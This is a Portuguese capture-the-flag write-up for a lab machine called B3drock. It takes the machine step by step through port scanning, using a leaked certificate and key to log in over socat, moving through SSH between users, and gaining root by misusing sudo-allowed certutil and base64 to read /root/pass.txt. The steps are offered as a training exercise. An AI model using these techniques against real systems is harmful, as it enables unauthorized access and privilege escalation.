# B3drock

* ### Scan de portas - Verificando quais portas estão abertas.
  
```bash
rustscan -a 10.10.60.35
```
![image](https://github.com/lufffe/Writeups/assets/90646635/010eeb0a-7482-4af6-adf8-e97b40288b44)

![image](https://github.com/lufffe/Writeups/assets/90646635/b8137ddb-0ad2-4753-b910-da78aed1faa1)


```bash
nmap -A 10.10.60.35
```
![image](https://github.com/lufffe/Writeups/assets/90646635/6ebc3077-d81c-4ff3-813c-fc73a9407db6)

```bash
nc 10.10.60.35 9009
```
![image](https://github.com/lufffe/Writeups/assets/90646635/4120b5e2-ec27-4a2e-a38f-a62bb2407f21)

![image](https://github.com/lufffe/Writeups/assets/90646635/074d4360-907b-4bd6-8f7f-b14011c6d436)

* ### Coloque as informações adquiridas nos arquivos.
```bash
code certificate
```

```bash
code key
```

```bash
socat stdio ssl:10.10.60.35:54321,cert=certificate,key=key,verify=0
```
![image](https://github.com/lufffe/Writeups/assets/90646635/66281428-9a70-42a8-a60e-75e29a6efe8c)

* ### Coloque as informações adquiridas nos arquivos.
```bash
ssh barney@10.10.60.35
```
![image](https://github.com/lufffe/Writeups/assets/90646635/11852891-30dd-4e7f-90d5-aaa85073174e)

* ### Flag Barney.
```bash
cat barney.txt
```
![image](https://github.com/lufffe/Writeups/assets/90646635/eb0ca3aa-ee76-4aa0-b8e3-aaef0963fd01)

```bash
barney@b3dr0ck:~$ sudo -l
```
![image](https://github.com/lufffe/Writeups/assets/90646635/2236979a-4176-4be0-8620-4e84f9ed6c40)

```bash
barney@b3dr0ck:/home/fred$ certutil -h
```
![image](https://github.com/lufffe/Writeups/assets/90646635/6dd5bb6c-7d8d-43ed-8167-0bab60e957c9)

```bash
barney@b3dr0ck:/home/fred$ certutil ls
```
![image](https://github.com/lufffe/Writeups/assets/90646635/099f1a1e-eb10-4046-8d31-d642f972029c)

```bash
barney@b3dr0ck:/home/fred$ sudo certutil -a fred.csr.pem
```
![image](https://github.com/lufffe/Writeups/assets/90646635/3480cfc0-0550-436b-85a3-e26114b91022)

```bash
socat stdio ssl:10.10.60.35:54321,cert=certificatefred,key=keyfred,verify=0
```
![image](https://github.com/lufffe/Writeups/assets/90646635/0779a22a-8d97-4794-b4be-1ab5a7bf1442)

```bash
ssh fred@10.10.60.35
```
![image](https://github.com/lufffe/Writeups/assets/90646635/f3d75a4c-4c83-4d56-9d06-8f41a65096c5)

```bash
fred@b3dr0ck:~$ sudo -l
```
![image](https://github.com/lufffe/Writeups/assets/90646635/86c1375c-a165-464c-a9f5-969340840d09)


```bash
sudo /usr/bin/base32 /root/pass.txt
```
![image](https://github.com/lufffe/Writeups/assets/90646635/2f5e76a2-9407-48c9-a70a-0e73dc059cb6)

```bash
sudo /usr/bin/base64 /root/pass.txt | base64 -d
```
![image](https://github.com/lufffe/Writeups/assets/90646635/1412f7f8-7c50-4a9e-bf7b-1527e0354aa3)

```bash
sudo /usr/bin/base64 /root/pass.txt | base64 -d | base32 -d
```
![image](https://github.com/lufffe/Writeups/assets/90646635/d8161a52-a4d1-4337-b810-305f76443d79)

```bash
sudo /usr/bin/base64 /root/pass.txt | base64 -d | base32 -d | base64 -d
```
![image](https://github.com/lufffe/Writeups/assets/90646635/bd918c3d-f3db-4e86-bb88-df31aecd8872)

* ### Decode hash.
https://crackstation.net/

```bash
su
```
![image](https://github.com/lufffe/Writeups/assets/90646635/a438990a-f757-4650-a3d6-5f23f85a0e47)

```bash
cat /root/root.txt
```
